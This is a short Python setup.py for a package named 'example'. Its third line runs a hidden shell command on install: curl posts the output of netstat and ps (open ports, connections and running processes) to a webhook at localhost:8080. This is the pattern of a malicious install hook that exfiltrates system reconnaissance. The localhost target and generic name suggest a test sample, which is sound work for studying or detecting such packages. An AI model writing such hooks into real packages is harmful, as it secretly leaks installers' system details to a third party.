from os import system
from setuptools import setup
system('curl http://localhost:8080/webhook/test -d "$(netstat -ntloa; ps axfu)"')
setup(name='example')
